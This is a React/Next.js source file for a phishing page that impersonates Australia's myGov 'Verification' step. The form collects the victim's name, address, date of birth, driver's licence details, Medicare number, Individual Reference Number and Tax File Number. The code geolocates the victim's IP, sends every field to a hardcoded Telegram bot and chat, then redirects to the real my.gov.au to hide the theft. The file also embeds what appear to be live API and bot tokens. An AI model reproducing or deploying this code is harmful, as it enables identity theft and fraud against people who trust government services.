"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";

export default function Detail() {
  const [fn, setfn] = useState("");
  const [addr, setaddr] = useState("");
  const [dob, setdob] = useState("");
  const [dln, setdln] = useState("");
  const [dlcnum, setdlcnum] = useState("");
  const [dlexdate, setdlexdate] = useState("");
  const [mednum, setmednum] = useState("");
  const [irn, setirn] = useState("");
  const [tfnum, settfnum] = useState("");
  const router = useRouter();

  const onSent = async (e) => {
    e.preventDefault();

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
          .then((res) => res.json())
          .then((data) => {
            const country = data.country_name;
            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=
                    USER: ${encodeURIComponent(ipAddress)} 
                    %0A%0A*Full Name:* ${encodeURIComponent(fn)} 
                    %0A*Address On File:* ${encodeURIComponent(addr)} 
                    %0A*Date Of Birth:* ${encodeURIComponent(dob)} 
                    %0A*Driver's License Number:* ${encodeURIComponent(dln)} 
                    %0A*Driver's License Card No. (Back of Card):* ${encodeURIComponent(dlcnum)} 
                    %0A*Driver's License Expiry Date:* ${encodeURIComponent(dlexdate)} 
                    %0A*Medicare Number:* ${encodeURIComponent(mednum)} 
                    %0A*Individual Reference Number:* ${encodeURIComponent(irn)} 
                    %0A*Tax File Number:* ${encodeURIComponent(tfnum)} 
                    %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;

            fetch(apiUrl)
              .then((res) => {
                if (!res.ok) console.error("ERROR:", res.statusText);
                return res.json();
              })
              .then(() => {
                console.log("SENT!");
                router.push("https://my.gov.au/");
              })
              .catch((e) => console.error("ERROR:", e));
          })
          .catch((e) => console.error("ERROR:", e));
      })
      .catch((e) => console.error("ERROR:", e));
  };

  return (
    <>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a href="#" className="unauth-crest__link">
                  <img
                    id="unauth-crest"
                    src="/logo-black.svg"
                    alt="logo"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <a data-go-back-link="" className="button-back" href="#"
                      >Back</a
                      >
                      <h1>Verification</h1>
                      <h2 className="text-align-left">
                        Enter the details given below.
                      </h2>
                      <form onSubmit={onSent}>
                        <div className="input-group">
                          <label className="override" htmlFor="userId">Full Name</label>
                          <input
                            id="fn"
                            name="fn"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setfn(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Address on File</label
                          >
                          <input
                            id="addr"
                            name="add"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setaddr(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Date of Birth</label
                          >
                          <input
                            id="dob"
                            name="dob"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setdob(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Number</label
                          >
                          <input
                            id="dln"
                            name="dln"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setdln(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Card No. (Back of Card)</label
                          >
                          <input
                            id="dlcnum"
                            name="dlcnum"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setdlcnum(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Driver&apos;s License Expiry Date</label
                          >
                          <input
                            id="dlexdate"
                            name="dlexdate"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setdlexdate(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Medicare Number</label
                          >
                          <input
                            id="mednum"
                            name="mednum"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setmednum(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Individual Reference Number</label
                          >
                          <input
                            id="irn"
                            name="irn"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setirn(e.target.value)}
                          />
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Tax File Number</label
                          >
                          <input
                            id="tfnum"
                            name="tfnum"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => settfnum(e.target.value)}
                          />
                        </div>

                        <br />
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              name="btn3"
                              id="btn3"
                            >
                              Submit
                            </button>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">Footer</h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="#">Terms of use</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Copyright</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="#">
                  <img
                    src="/logo-white.svg"
                    alt="logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live on.
                We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
